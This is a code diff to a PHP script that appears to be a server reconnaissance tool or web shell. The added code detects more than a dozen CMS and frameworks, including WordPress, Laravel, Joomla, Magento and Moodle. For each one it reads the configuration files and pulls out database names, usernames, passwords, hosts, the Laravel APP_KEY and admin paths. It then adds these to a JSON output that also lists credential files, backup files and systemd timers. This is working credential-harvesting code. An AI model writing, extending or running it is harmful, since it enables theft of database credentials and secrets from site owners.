@@ -487,6 +487,265 @@ $content = @file_get_contents($ef, false, null, 0, 8192);
 if ($content) $envContents[$ef] = $content;
 }
 
+// --- Framework / CMS detection ---
+$frameworks = [];
+$docRoot = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
+$searchRoots = array_unique(array_filter([$docRoot, getcwd(), dirname($docRoot)]));
+
+// Helper: try to read a file and extract a version pattern
+$__fwReadVer = function($path, $pattern) {
+    $content = @file_get_contents($path, false, null, 0, 16384);
+    if (!$content) return null;
+    if (preg_match($pattern, $content, $m)) return $m[1];
+    return null;
+};
+
+// Helper: check file exists relative to any search root
+$__fwFind = function($relPath) use ($searchRoots) {
+    foreach ($searchRoots as $root) {
+        $full = rtrim($root, '/') . '/' . ltrim($relPath, '/');
+        if (@file_exists($full)) return $full;
+    }
+    return null;
+};
+
+// WordPress
+if ($p = $__fwFind('wp-includes/version.php')) {
+    $ver = $__fwReadVer($p, '/\\$wp_version\\s*=\\s*[\'"]([^\'"]+)/');
+    $fw = ['name' => 'WordPress', 'version' => $ver, 'config_path' => null, 'details' => []];
+    if ($cp = $__fwFind('wp-config.php')) {
+        $fw['config_path'] = $cp;
+        $wpc = @file_get_contents($cp, false, null, 0, 16384);
+        if ($wpc) {
+            if (preg_match("/define\\s*\\(\\s*['\"]DB_NAME['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m)) $fw['details']['db_name'] = $m[1];
+            if (preg_match("/define\\s*\\(\\s*['\"]DB_USER['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m)) $fw['details']['db_user'] = $m[1];
+            if (preg_match("/define\\s*\\(\\s*['\"]DB_PASSWORD['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m)) $fw['details']['db_pass'] = $m[1];
+            if (preg_match("/define\\s*\\(\\s*['\"]DB_HOST['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m)) $fw['details']['db_host'] = $m[1];
+            if (preg_match("/\\$table_prefix\\s*=\\s*['\"]([^'\"]*)/", $wpc, $m)) $fw['details']['table_prefix'] = $m[1];
+            $fw['details']['debug'] = (stripos($wpc, "'WP_DEBUG', true") !== false || stripos($wpc, "'WP_DEBUG',true") !== false) ? 'enabled' : 'disabled';
+        }
+    }
+    if ($plugDir = $__fwFind('wp-content/plugins')) $fw['details']['plugins'] = count(@scandir($plugDir) ?: []) - 2;
+    if ($themeDir = $__fwFind('wp-content/themes')) $fw['details']['themes'] = count(@scandir($themeDir) ?: []) - 2;
+    $fw['details']['admin_path'] = '/wp-admin/';
+    $frameworks[] = $fw;
+}
+
+// Laravel
+if ($p = $__fwFind('artisan')) {
+    $ver = null;
+    $appFile = $__fwFind('vendor/laravel/framework/src/Illuminate/Foundation/Application.php');
+    if ($appFile) $ver = $__fwReadVer($appFile, "/const\\s+VERSION\\s*=\\s*['\"]([^'\"]+)/");
+    $fw = ['name' => 'Laravel', 'version' => $ver, 'config_path' => null, 'details' => []];
+    if ($envFile = $__fwFind('.env')) {
+        $fw['config_path'] = $envFile;
+        $env = @file_get_contents($envFile, false, null, 0, 8192);
+        if ($env) {
+            if (preg_match('/^DB_DATABASE=(.*)$/m', $env, $m)) $fw['details']['db_name'] = trim($m[1]);
+            if (preg_match('/^DB_USERNAME=(.*)$/m', $env, $m)) $fw['details']['db_user'] = trim($m[1]);
+            if (preg_match('/^DB_PASSWORD=(.*)$/m', $env, $m)) $fw['details']['db_pass'] = trim($m[1]);
+            if (preg_match('/^DB_HOST=(.*)$/m', $env, $m)) $fw['details']['db_host'] = trim($m[1]);
+            if (preg_match('/^DB_CONNECTION=(.*)$/m', $env, $m)) $fw['details']['db_driver'] = trim($m[1]);
+            if (preg_match('/^APP_DEBUG=(.*)$/m', $env, $m)) $fw['details']['debug'] = strtolower(trim($m[1])) === 'true' ? 'enabled' : 'disabled';
+            if (preg_match('/^APP_KEY=(.*)$/m', $env, $m)) $fw['details']['app_key'] = trim($m[1]);
+        }
+    }
+    if ($storageLog = $__fwFind('storage/logs/laravel.log')) $fw['details']['log_file'] = $storageLog;
+    $frameworks[] = $fw;
+}
+
+// Joomla
+if ($p = $__fwFind('libraries/src/Version.php')) {
+    $ver = $__fwReadVer($p, "/MAJOR_VERSION\\s*=\\s*(\\d+)/");
+    $minVer = $__fwReadVer($p, "/MINOR_VERSION\\s*=\\s*(\\d+)/");
+    $patchVer = $__fwReadVer($p, "/PATCH_VERSION\\s*=\\s*(\\d+)/");
+    if ($ver && $minVer) $ver = $ver . '.' . $minVer . ($patchVer ? '.' . $patchVer : '');
+    $fw = ['name' => 'Joomla', 'version' => $ver, 'config_path' => null, 'details' => []];
+    if ($cp = $__fwFind('configuration.php')) {
+        $fw['config_path'] = $cp;
+        $jc = @file_get_contents($cp, false, null, 0, 16384);
+        if ($jc) {
+            if (preg_match("/\\$db\\s*=\\s*['\"]([^'\"]*)/", $jc, $m)) $fw['details']['db_name'] = $m[1];
+            if (preg_match("/\\$user\\s*=\\s*['\"]([^'\"]*)/", $jc, $m)) $fw['details']['db_user'] = $m[1];
+            if (preg_match("/\\$password\\s*=\\s*['\"]([^'\"]*)/", $jc, $m)) $fw['details']['db_pass'] = $m[1];
+            if (preg_match("/\\$host\\s*=\\s*['\"]([^'\"]*)/", $jc, $m)) $fw['details']['db_host'] = $m[1];
+            if (preg_match("/\\$dbprefix\\s*=\\s*['\"]([^'\"]*)/", $jc, $m)) $fw['details']['table_prefix'] = $m[1];
+            $fw['details']['debug'] = (preg_match("/\\$debug\\s*=\\s*['\"]?1/", $jc)) ? 'enabled' : 'disabled';
+        }
+    }
+    $fw['details']['admin_path'] = '/administrator/';
+    $frameworks[] = $fw;
+}
+
+// Drupal
+if ($p = $__fwFind('core/lib/Drupal.php')) {
+    $ver = $__fwReadVer($p, "/const\\s+VERSION\\s*=\\s*['\"]([^'\"]+)/");
+    $fw = ['name' => 'Drupal', 'version' => $ver, 'config_path' => null, 'details' => []];
+    $settingsFile = $__fwFind('sites/default/settings.php');
+    if ($settingsFile) {
+        $fw['config_path'] = $settingsFile;
+        $fw['details']['admin_path'] = '/admin/';
+    }
+    $frameworks[] = $fw;
+}
+
+// Symfony
+if ($p = $__fwFind('vendor/symfony/http-kernel/Kernel.php')) {
+    $ver = $__fwReadVer($p, "/const\\s+VERSION\\s*=\\s*['\"]([^'\"]+)/");
+    $fw = ['name' => 'Symfony', 'version' => $ver, 'config_path' => null, 'details' => []];
+    if ($envFile = $__fwFind('.env')) {
+        $fw['config_path'] = $envFile;
+        $env = @file_get_contents($envFile, false, null, 0, 8192);
+        if ($env && preg_match('/^DATABASE_URL=(.*)$/m', $env, $m)) {
+            $fw['details']['database_url'] = trim($m[1]);
+        }
+        if ($env && preg_match('/^APP_ENV=(.*)$/m', $env, $m)) $fw['details']['app_env'] = trim($m[1]);
+        if ($env && preg_match('/^APP_DEBUG=(.*)$/m', $env, $m)) $fw['details']['debug'] = strtolower(trim($m[1])) === '1' ? 'enabled' : 'disabled';
+    }
+    $frameworks[] = $fw;
+}
+
+// CodeIgniter 4
+if ($p = $__fwFind('vendor/codeigniter4/framework/system/CodeIgniter.php')) {
+    $ver = $__fwReadVer($p, "/const\\s+CI_VERSION\\s*=\\s*['\"]([^'\"]+)/");
+    $fw = ['name' => 'CodeIgniter', 'version' => $ver, 'config_path' => null, 'details' => []];
+    if ($envFile = $__fwFind('.env')) $fw['config_path'] = $envFile;
+    $frameworks[] = $fw;
+}
+
+// Magento
+if ($p = $__fwFind('app/Mage.php')) {
+    $ver = $__fwReadVer($p, "/getVersion[^}]*return\\s*['\"]([^'\"]+)/s");
+    $fw = ['name' => 'Magento 1', 'version' => $ver, 'config_path' => null, 'details' => []];
+    if ($cp = $__fwFind('app/etc/local.xml')) $fw['config_path'] = $cp;
+    $fw['details']['admin_path'] = '/admin/';
+    $frameworks[] = $fw;
+} elseif ($p = $__fwFind('vendor/magento/framework/AppInterface.php')) {
+    $ver = $__fwReadVer($p, "/VERSION\\s*=\\s*['\"]([^'\"]+)/");
+    $fw = ['name' => 'Magento 2', 'version' => $ver, 'config_path' => null, 'details' => []];
+    if ($cp = $__fwFind('app/etc/env.php')) {
+        $fw['config_path'] = $cp;
+        $mc = @file_get_contents($cp, false, null, 0, 16384);
+        if ($mc) {
+            if (preg_match("/'dbname'\\s*=>\\s*'([^']*)/", $mc, $m)) $fw['details']['db_name'] = $m[1];
+            if (preg_match("/'username'\\s*=>\\s*'([^']*)/", $mc, $m)) $fw['details']['db_user'] = $m[1];
+            if (preg_match("/'password'\\s*=>\\s*'([^']*)/", $mc, $m)) $fw['details']['db_pass'] = $m[1];
+            if (preg_match("/'host'\\s*=>\\s*'([^']*)/", $mc, $m)) $fw['details']['db_host'] = $m[1];
+        }
+    }
+    $frameworks[] = $fw;
+}
+
+// PrestaShop
+if ($p = $__fwFind('config/settings.inc.php')) {
+    $ver = $__fwReadVer($p, "/_PS_VERSION_.*?['\"]([\\d.]+)/");
+    $fw = ['name' => 'PrestaShop', 'version' => $ver, 'config_path' => $p, 'details' => []];
+    $psc = @file_get_contents($p, false, null, 0, 8192);
+    if ($psc) {
+        if (preg_match("/_DB_NAME_.*?['\"]([^'\"]+)/", $psc, $m)) $fw['details']['db_name'] = $m[1];
+        if (preg_match("/_DB_USER_.*?['\"]([^'\"]+)/", $psc, $m)) $fw['details']['db_user'] = $m[1];
+        if (preg_match("/_DB_PASSWD_.*?['\"]([^'\"]+)/", $psc, $m)) $fw['details']['db_pass'] = $m[1];
+        if (preg_match("/_DB_SERVER_.*?['\"]([^'\"]+)/", $psc, $m)) $fw['details']['db_host'] = $m[1];
+    }
+    $frameworks[] = $fw;
+}
+
+// NextCloud / OwnCloud
+if ($p = $__fwFind('version.php')) {
+    $vc = @file_get_contents($p, false, null, 0, 4096);
+    if ($vc && (stripos($vc, 'Nextcloud') !== false || stripos($vc, 'OwnCloud') !== false || preg_match('/\\$OC_/', $vc))) {
+        $name = (stripos($vc, 'Nextcloud') !== false) ? 'Nextcloud' : 'OwnCloud';
+        $ver = null;
+        if (preg_match('/\\$OC_VersionString\\s*=\\s*[\'"]([^\'"]+)/', $vc, $m)) $ver = $m[1];
+        $fw = ['name' => $name, 'version' => $ver, 'config_path' => null, 'details' => []];
+        if ($cp = $__fwFind('config/config.php')) {
+            $fw['config_path'] = $cp;
+            $nc = @file_get_contents($cp, false, null, 0, 16384);
+            if ($nc) {
+                if (preg_match("/'dbname'\\s*=>\\s*'([^']*)/", $nc, $m)) $fw['details']['db_name'] = $m[1];
+                if (preg_match("/'dbuser'\\s*=>\\s*'([^']*)/", $nc, $m)) $fw['details']['db_user'] = $m[1];
+                if (preg_match("/'dbpassword'\\s*=>\\s*'([^']*)/", $nc, $m)) $fw['details']['db_pass'] = $m[1];
+                if (preg_match("/'dbhost'\\s*=>\\s*'([^']*)/", $nc, $m)) $fw['details']['db_host'] = $m[1];
+            }
+        }
+        $frameworks[] = $fw;
+    }
+}
+
+// phpBB
+if ($p = $__fwFind('includes/constants.php')) {
+    $ver = $__fwReadVer($p, "/PHPBB_VERSION.*?['\"]([\\d.]+)/");
+    if ($ver) {
+        $fw = ['name' => 'phpBB', 'version' => $ver, 'config_path' => null, 'details' => []];
+        if ($cp = $__fwFind('config.php')) {
+            $fw['config_path'] = $cp;
+            $pc = @file_get_contents($cp, false, null, 0, 8192);
+            if ($pc) {
+                if (preg_match("/dbname.*?['\"]([^'\"]+)/", $pc, $m)) $fw['details']['db_name'] = $m[1];
+                if (preg_match("/dbuser.*?['\"]([^'\"]+)/", $pc, $m)) $fw['details']['db_user'] = $m[1];
+                if (preg_match("/dbpasswd.*?['\"]([^'\"]+)/", $pc, $m)) $fw['details']['db_pass'] = $m[1];
+                if (preg_match("/dbhost.*?['\"]([^'\"]+)/", $pc, $m)) $fw['details']['db_host'] = $m[1];
+            }
+        }
+        $fw['details']['admin_path'] = '/adm/';
+        $frameworks[] = $fw;
+    }
+}
+
+// MediaWiki
+if ($p = $__fwFind('includes/DefaultSettings.php')) {
+    $ver = $__fwReadVer($p, "/\\$wgVersion\\s*=\\s*['\"]([^'\"]+)/");
+    if ($ver) {
+        $fw = ['name' => 'MediaWiki', 'version' => $ver, 'config_path' => null, 'details' => []];
+        if ($cp = $__fwFind('LocalSettings.php')) {
+            $fw['config_path'] = $cp;
+            $mw = @file_get_contents($cp, false, null, 0, 16384);
+            if ($mw) {
+                if (preg_match("/\\$wgDBname\\s*=\\s*['\"]([^'\"]+)/", $mw, $m)) $fw['details']['db_name'] = $m[1];
+                if (preg_match("/\\$wgDBuser\\s*=\\s*['\"]([^'\"]+)/", $mw, $m)) $fw['details']['db_user'] = $m[1];
+                if (preg_match("/\\$wgDBpassword\\s*=\\s*['\"]([^'\"]+)/", $mw, $m)) $fw['details']['db_pass'] = $m[1];
+                if (preg_match("/\\$wgDBserver\\s*=\\s*['\"]([^'\"]+)/", $mw, $m)) $fw['details']['db_host'] = $m[1];
+            }
+        }
+        $frameworks[] = $fw;
+    }
+}
+
+// Moodle
+if ($p = $__fwFind('version.php')) {
+    $vc = @file_get_contents($p, false, null, 0, 4096);
+    if ($vc && preg_match('/\\$release\\s*=\\s*[\'"]([^\'"]+)/', $vc, $m) && stripos($m[1], 'Moodle') !== false) {
+        $fw = ['name' => 'Moodle', 'version' => $m[1], 'config_path' => null, 'details' => []];
+        if ($cp = $__fwFind('config.php')) {
+            $fw['config_path'] = $cp;
+            $mc = @file_get_contents($cp, false, null, 0, 8192);
+            if ($mc) {
+                if (preg_match("/\\$CFG->dbname\\s*=\\s*['\"]([^'\"]+)/", $mc, $m)) $fw['details']['db_name'] = $m[1];
+                if (preg_match("/\\$CFG->dbuser\\s*=\\s*['\"]([^'\"]+)/", $mc, $m)) $fw['details']['db_user'] = $m[1];
+                if (preg_match("/\\$CFG->dbpass\\s*=\\s*['\"]([^'\"]+)/", $mc, $m)) $fw['details']['db_pass'] = $m[1];
+                if (preg_match("/\\$CFG->dbhost\\s*=\\s*['\"]([^'\"]+)/", $mc, $m)) $fw['details']['db_host'] = $m[1];
+            }
+        }
+        $frameworks[] = $fw;
+    }
+}
+
+// CakePHP
+if ($p = $__fwFind('vendor/cakephp/cakephp/VERSION.txt')) {
+    $ver = trim(@file_get_contents($p, false, null, 0, 64) ?: '');
+    $fw = ['name' => 'CakePHP', 'version' => $ver ?: null, 'config_path' => null, 'details' => []];
+    if ($cp = $__fwFind('config/app_local.php')) $fw['config_path'] = $cp;
+    elseif ($cp = $__fwFind('config/app.php')) $fw['config_path'] = $cp;
+    $frameworks[] = $fw;
+}
+
+// Yii2
+if ($p = $__fwFind('vendor/yiisoft/yii2/BaseYii.php')) {
+    $ver = $__fwReadVer($p, "/getVersion[^}]*return\\s*['\"]([^'\"]+)/s");
+    $fw = ['name' => 'Yii2', 'version' => $ver, 'config_path' => null, 'details' => []];
+    $frameworks[] = $fw;
+}
+
 // --- Assemble response ---
 $__diag = [
 'php_version' => phpversion(),
@@ -537,6 +796,7 @@ $__diag = [
 'systemd_timers' => $systemdTimers,
 'credential_files' => $credentialFiles,
 'backup_files' => $backupFiles,
+'frameworks' => $frameworks,
 ];
 $__jflags = (defined('JSON_INVALID_UTF8_SUBSTITUTE') ? JSON_INVALID_UTF8_SUBSTITUTE : 0) | (defined('JSON_PARTIAL_OUTPUT_ON_ERROR') ? JSON_PARTIAL_OUTPUT_ON_ERROR : 0);
 $__out = json_encode($__diag, $__jflags);
